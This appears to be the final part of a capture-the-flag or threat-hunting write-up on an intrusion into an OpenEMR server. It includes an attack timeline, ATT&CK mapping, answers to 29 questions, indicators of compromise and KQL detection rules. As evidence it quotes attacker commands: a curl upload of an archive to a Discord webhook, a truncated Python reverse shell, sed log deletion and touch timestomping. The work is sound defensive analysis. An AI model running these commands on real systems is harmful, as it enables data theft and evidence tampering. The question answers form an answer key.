```text
T1070,T1070.006
```

> 🚩 **Q29 — EDR Classification:** `T1070,T1070.006`

---

## Complete Attack Timeline

```text
2026-02-04–02-14  Investigation window
2026-02-08 16:25  Suspicious it.admin remote session from external IP
2026-02-08 16:25  Operator runs w to check logged-in users
2026-02-08 16:35  Operator runs docker ps
2026-02-09        Operator fingerprints Rocky Linux environment
2026-02-09        Operator escalates with sudo -i
2026-02-09        Docker/OpenEMR runtime inspected
2026-02-09        /etc/openemr/audit_export.env read
2026-02-09        Docker volume storage enumerated
2026-02-09        Unauthorized account system appears in logon activity
2026-02-09        Identity files modified using vipw-style workflow
2026-02-10        Backup automation path /opt/backup/scripts/backup_manifest.sh investigated
2026-02-10 22:00 Archive created under /var/lib/integrations
2026-02-10        integration-monitor.service persistence created
2026-02-11 04:16 systemd persistence service activated
2026-02-11 04:17 Python reverse shell attempts C2 to 20.62.27.80:443
2026-02-11 04:18 Spawned interactive shell /bin/sh -i appears as PID 8000
2026-02-11 04:22 SSH/SFTP transfer attempt to 20.62.27.80:22 fails
2026-02-13 20:10 curl uploads staged archive to Discord webhook over HTTPS
2026-02-11 16:13–16:16 Selective sed-based log deletion occurs
2026-02-11 16:xx /var/log/messages backdated to 2026-02-06 12:00:00
2026-02-11        EDR raises suspicious timestamp modification alert
```

---

## MITRE ATT&CK Mapping

The Rocky Clinic intrusion used a low-noise, living-off-the-land approach. The attacker relied heavily on legitimate Linux utilities, valid account access, Docker runtime visibility, trusted automation paths, systemd persistence, and selective anti-forensic cleanup.

> Note: Some mappings are direct from EDR alert telemetry, while others are analyst-assessed based on observed behaviour.

| Phase                      | Observed Behaviour                                                     | Evidence                                                                                                 | MITRE Technique                                                          |
| -------------------------- | ---------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| Initial Access             | Suspicious remote access using an existing administrative account      | `it.admin` remote logons from external IP activity                                                       | **T1078 — Valid Accounts**                                               |
| Discovery                  | Operator checked who else was logged into the host                     | `w`, Process ID `17507`                                                                                  | **T1033 — System Owner/User Discovery**                                  |
| Discovery                  | Operator fingerprinted the Linux environment                           | `cat /etc/os-release /etc/redhat-release /etc/rocky-release /etc/system-release`                         | **T1082 — System Information Discovery**                                 |
| Discovery                  | Operator inspected Docker/OpenEMR runtime                              | `docker inspect openemr-mariadb`                                                                         | **T1613 — Container and Resource Discovery**                             |
| Discovery                  | Operator enumerated Docker volume storage                              | `find /var/lib/docker/volumes -maxdepth 3 -type f`                                                       | **T1613 — Container and Resource Discovery**                             |
| Privilege Escalation       | Operator moved into a privileged interactive shell                     | `sudo -i`                                                                                                | **T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching** |
| Credential / Secret Access | Operator read durable automation configuration under `/etc`            | `sed -n 1,200p /etc/openemr/audit_export.env`                                                            | **T1552.001 — Unsecured Credentials: Credentials In Files**              |
| Persistence                | Unauthorized account was created or abused for continued access        | `system` account with suspicious logon activity                                                          | **T1136 — Create Account** / **T1078 — Valid Accounts**                  |
| Persistence                | Identity files were modified using admin-style tooling                 | `vipw`, `/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/gshadow`                                       | **T1098 — Account Manipulation**                                         |
| Persistence                | systemd service artifact was created                                   | `/etc/systemd/system/integration-monitor.service`                                                        | **T1543.002 — Create or Modify System Process: Systemd Service**         |
| Execution                  | Service launched a Python reverse shell                                | `/usr/bin/python3 -c 'import socket,subprocess,os;...'`                                                  | **T1059.006 — Command and Scripting Interpreter: Python**                |
| Command and Control        | Reverse shell connected outbound to attacker-controlled infrastructure | `20.62.27.80:443`                                                                                        | **T1071.001 — Application Layer Protocol: Web Protocols**                |
| Collection                 | Operator archived staged OpenEMR document export data                  | `integration_state_2026-02-10_22-00-01.tar.gz`                                                           | **T1560 — Archive Collected Data**                                       |
| Collection / Staging       | Archive was written to an operational-looking staging directory        | `/var/lib/integrations`                                                                                  | **T1074.001 — Data Staged: Local Data Staging**                          |
| Exfiltration Attempt       | Operator attempted structured transfer over SSH/SFTP                   | `/usr/bin/ssh ... 20.62.27.80 sftp`                                                                      | **T1048 — Exfiltration Over Alternative Protocol**                       |
| Exfiltration               | Operator uploaded archive to Discord webhook using HTTPS               | `curl -F file=@integration_state_2026-02-10_22-00-01.tar.gz https://discord.com/api/webhooks/[REDACTED]` | **T1567 — Exfiltration Over Web Service**                                |
| Defense Evasion            | Operator selectively deleted log lines using `sed -i`                  | `sed -i /pattern/d /var/log/secure`, `/var/log/messages`                                                 | **T1070 — Indicator Removal**                                            |
| Defense Evasion            | Operator modified log file timestamp                                   | `touch -d "2026-02-06 12:00:00" /var/log/messages`                                                       | **T1070.006 — Indicator Removal: Timestomp**                             |
| Defense Evasion            | EDR alert directly classified cleanup and timestamp activity           | `AttackTechniques: T1070,T1070.006`                                                                      | **T1070 — Indicator Removal**, **T1070.006 — Timestomp**                 |

### ATT&CK Technique Summary

| Technique ID  | Technique Name                         | Where It Appeared                                                    |
| ------------- | -------------------------------------- | -------------------------------------------------------------------- |
| **T1078**     | Valid Accounts                         | Suspicious use of `it.admin`; unauthorized `system` account activity |
| **T1033**     | System Owner/User Discovery            | `w` command used to check logged-in users                            |
| **T1082**     | System Information Discovery           | Linux release files read for host fingerprinting                     |
| **T1613**     | Container and Resource Discovery       | Docker container and volume inspection                               |
| **T1548.003** | Sudo and Sudo Caching                  | `sudo -i` privilege escalation                                       |
| **T1552.001** | Credentials In Files                   | `/etc/openemr/audit_export.env` read                                 |
| **T1136**     | Create Account                         | Unauthorized `system` account                                        |
| **T1098**     | Account Manipulation                   | Identity file changes through `vipw` workflow                        |
| **T1543.002** | Systemd Service                        | `integration-monitor.service` persistence                            |
| **T1059.006** | Python                                 | Python reverse shell                                                 |
| **T1071.001** | Web Protocols                          | Reverse shell over TCP/443                                           |
| **T1560**     | Archive Collected Data                 | `.tar.gz` archive prepared for transfer                              |
| **T1074.001** | Local Data Staging                     | `/var/lib/integrations` staging directory                            |
| **T1048**     | Exfiltration Over Alternative Protocol | Failed SSH/SFTP transfer attempt                                     |
| **T1567**     | Exfiltration Over Web Service          | Discord webhook upload                                               |
| **T1070**     | Indicator Removal                      | `sed -i` log deletion and EDR alert                                  |
| **T1070.006** | Timestomp                              | `touch -d` backdating of `/var/log/messages`                         |

### Key ATT&CK Takeaway

This was not a noisy malware-driven intrusion. The attacker progressed through the environment using legitimate Linux and administrative tooling:

* `w` for user discovery
* `sudo` for privilege escalation
* `docker` for container discovery
* `sed` for config reading and log cleanup
* `vipw` for identity manipulation
* `cat` for no-editor file creation
* `systemd` for persistence
* `python3` for reverse shell execution
* `scp` and `curl` for transfer and exfiltration
* `touch` for timestomping

The strongest confirmed EDR ATT&CK classification was:

```text
T1070,T1070.006
```

This directly mapped the cleanup activity to **Indicator Removal** and **Timestomp**.



## Summary of All Findings

| Q   | Category                 | Finding                                                            | MITRE               |
| --- | ------------------------ | ------------------------------------------------------------------ | ------------------- |
| Q01 | Asset Identification     | `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net`      | —                   |
| Q02 | Runtime                  | `Docker`                                                           | —                   |
| Q03 | User Discovery           | `17507`                                                            | T1033               |
| Q04 | Session Boundary         | `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d` | —                   |
| Q05 | Account Attribution      | `it.admin`                                                         | T1078               |
| Q06 | Environment Discovery    | `4`                                                                | T1082               |
| Q07 | OS Confirmation          | `RockyLinux`                                                       | —                   |
| Q08 | Privilege Escalation     | `sudo -i`                                                          | —                   |
| Q09 | Runtime Discovery        | `docker inspect openemr-mariadb`                                   | T1613               |
| Q10 | Credentials in Files     | `sed -n 1,200p /etc/openemr/audit_export.env`                      | T1552.001           |
| Q11 | Docker Volume Mapping    | `find /var/lib/docker/volumes -maxdepth 3 -type f`                 | T1613               |
| Q12 | Data Location            | `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data`            | —                   |
| Q13 | Trusted Automation Abuse | `/opt/backup/scripts/backup_manifest.sh`                           | —                   |
| Q14 | Local Data Staging       | `/var/lib/integrations`                                            | T1074.001           |
| Q15 | Unauthorized Account     | `system`                                                           | T1136               |
| Q16 | Identity Modification    | `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` | T1136 / T1098       |
| Q17 | Persistence              | `integration-monitor.service`                                      | systemd persistence |
| Q18 | No-Editor Creation       | `cat`                                                              | —                   |
| Q19 | Persistence Hash         | `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` | —                   |
| Q20 | Reverse Shell            | `/usr/bin/python3 -c ...`                                          | T1059.006           |
| Q21 | Spawned Shell PID        | `8000`                                                             | T1059               |
| Q22 | Archive                  | `integration_state_2026-02-10_22-00-01.tar.gz`                     | T1560               |
| Q23 | Failed Exfil             | `/usr/bin/ssh ... sftp`                                            | T1105 / T1041       |
| Q24 | SaaS Exfil               | `curl -F file=@... discord.com/api/webhooks/[REDACTED]`            | T1567               |
| Q25 | Exfil Endpoint           | `162.159.135.232:443`                                              | T1041               |
| Q26 | Log Deletion Count       | `12`                                                               | T1070               |
| Q27 | Log Manipulation Tool    | `sed`                                                              | T1070               |
| Q28 | Timestomp                | `2026-02-06 12:00:00`                                              | T1070.006           |
| Q29 | EDR Classification       | `T1070,T1070.006`                                                  | T1070 / T1070.006   |

---

## Indicators of Compromise

### Accounts

| IOC          | Type    | Context                                 |
| ------------ | ------- | --------------------------------------- |
| `it.admin`   | Account | Suspicious remote operator account      |
| `system`     | Account | Unauthorized persistence identity       |
| `svc.backup` | Account | Trusted backup automation context       |
| `streetrack` | Account | Remote user in failed SSH/SFTP transfer |

### Hosts and Network

| IOC                                                           | Type     | Context                                 |
| ------------------------------------------------------------- | -------- | --------------------------------------- |
| `rocky83.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net` | Host     | Compromised OpenEMR host                |
| `37.19.221.234`                                               | IP       | Suspicious external logon source        |
| `20.62.27.80`                                                 | IP       | C2 and failed SFTP transfer destination |
| `20.62.27.80:443`                                             | Endpoint | Python reverse shell destination        |
| `20.62.27.80:22`                                              | Endpoint | Failed SSH/SFTP transfer                |
| `162.159.135.232:443`                                         | Endpoint | Successful HTTPS exfiltration endpoint  |
| `discord.com/api/webhooks/[REDACTED]`                         | URL      | SaaS exfiltration endpoint              |

### Files and Paths

| IOC                                                     | Type      | Context                             |
| ------------------------------------------------------- | --------- | ----------------------------------- |
| `/etc/openemr/audit_export.env`                         | File      | Privileged automation configuration |
| `/var/lib/docker/volumes/r0ckyyy335_mariadb_data/_data` | Directory | Persistent MariaDB storage          |
| `/opt/backup/scripts/backup_manifest.sh`                | File      | Trusted automation script           |
| `/var/lib/integrations`                                 | Directory | Staging directory                   |
| `integration_state_2026-02-10_22-00-01.tar.gz`          | File      | Staged archive                      |
| `/etc/systemd/system/integration-monitor.service`       | File      | systemd persistence artifact        |
| `/var/log/secure`                                       | File      | Selective cleanup target            |
| `/var/log/messages`                                     | File      | Cleanup and timestomping target     |

### Hashes

| SHA256                                                             | Context                                       |
| ------------------------------------------------------------------ | --------------------------------------------- |
| `a7b78ff3f501951cd8455697ef1b6dc1832ae42a9433926a8504d6ad719d729d` | Docker binary behind session-boundary command |
| `dbb794466563134e5119efa47fd41c4ffb31a8104b59bba11eb630f55238abd0` | `vipw` binary used in identity modification   |
| `f71ea834a9be9fb0e90c7b496e5312072fffedf1d1c0377957e05714bdac37b8` | Service file version used for C2 launch       |

---

## Response Actions Recommended

* Isolate `rocky83` for forensic preservation.
* Disable or reset credentials for `it.admin`.
* Disable and investigate the unauthorized `system` account.
* Rotate any credentials or secrets referenced in `/etc/openemr/audit_export.env`.
* Review and remove unauthorized systemd service `integration-monitor.service`.
* Audit all files under `/etc/systemd/system/` for unauthorized services.
* Review Docker containers, images, and volumes for tampering.
* Preserve `/var/lib/integrations` and staged archive evidence.
* Block or monitor traffic to `20.62.27.80`.
* Investigate outbound traffic to Discord webhook endpoints.
* Review `/var/log/secure` and `/var/log/messages` integrity from centralized logging.
* Deploy detections for `sed -i` log manipulation and `touch -d` timestomping.

---

## Detection Rules — Take-Home KQL

### Detect `sed -i` Against Linux Logs

```kql
DeviceProcessEvents
| where FileName =~ "sed"
| where ProcessCommandLine has "-i"
| where ProcessCommandLine has_any ("/var/log/secure", "/var/log/messages", "/var/log/")
| where ProcessCommandLine has "/d"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```

### Detect Timestomping Against Log Files

```kql
DeviceProcessEvents
| where FileName =~ "touch"
| where ProcessCommandLine has_any ("-d", "-t", "--date")
| where ProcessCommandLine has "/var/log/"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```

### Detect Suspicious systemd Service Creation

```kql
DeviceFileEvents
| where FolderPath startswith "/etc/systemd/system/"
| where ActionType in ("FileCreated", "FileModified")
| project Timestamp, DeviceName, ActionType, FileName, FolderPath,
          InitiatingProcessFileName, InitiatingProcessCommandLine
```

### Detect Python Reverse Shell Patterns

```kql
DeviceProcessEvents
| where FileName has_any ("python", "python3", "python3.9")
| where ProcessCommandLine has_all ("import socket", "os.dup2", "subprocess", "/bin/sh")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, ProcessId
```

### Detect Discord Webhook File Uploads from Servers

```kql
DeviceNetworkEvents
| where InitiatingProcessCommandLine has "discord.com/api/webhooks"
   or RemoteUrl has "discord.com/api/webhooks"
| project Timestamp, DeviceName, InitiatingProcessFileName,
          InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
```

### Detect Docker Volume Enumeration

```kql
DeviceProcessEvents
| where ProcessCommandLine has "/var/lib/docker/volumes"
| where FileName in~ ("find", "ls", "du", "tree")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Detect Reads of Sensitive `.env` Files Under `/etc`

```kql
DeviceProcessEvents
| where ProcessCommandLine has ".env"
| where ProcessCommandLine has "/etc/"
| where FileName in~ ("cat", "sed", "awk", "grep", "less", "more", "head", "tail", "strings")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

---

## References

* [MITRE ATT&CK — Enterprise Matrix](https://attack.mitre.org/)
* [T1033 — System Owner/User Discovery](https://attack.mitre.org/techniques/T1033/)
* [T1552.001 — Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
* [T1059.006 — Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/)
* [T1070 — Indicator Removal](https://attack.mitre.org/techniques/T1070/)
* [T1070.006 — Timestomp](https://attack.mitre.org/techniques/T1070/006/)
* [T1567 — Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567/)
* [Microsoft Defender Advanced Hunting Schema](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-schema-tables)
* [Kusto Query Language Documentation](https://learn.microsoft.com/en-us/kusto/query/)
